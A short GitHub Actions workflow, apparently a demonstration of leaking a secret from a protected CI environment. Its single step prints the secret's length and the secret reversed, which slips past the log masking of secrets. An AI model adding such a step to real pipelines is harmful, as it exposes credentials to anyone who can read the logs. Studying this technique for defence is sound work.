name: Protected environment secret exfiltration

on:
  workflow_dispatch:

jobs:
  reveal-protected-secret:
    name: Reveal protected environment secret
    runs-on: ubuntu-latest
    environment:
      name: protected-environment
    steps:
      - name: Print protected environment secret
        env:
          PROTECTED_ENV_SECRET: ${{ secrets.PROTECTED_ENV_SECRET }}
        run: |
          python - <<'PY'
import os
secret = os.environ['PROTECTED_ENV_SECRET']
print('Protected environment secret length:', len(secret))
print('Protected environment secret (reversed):', ''.join(reversed(secret)))
PY
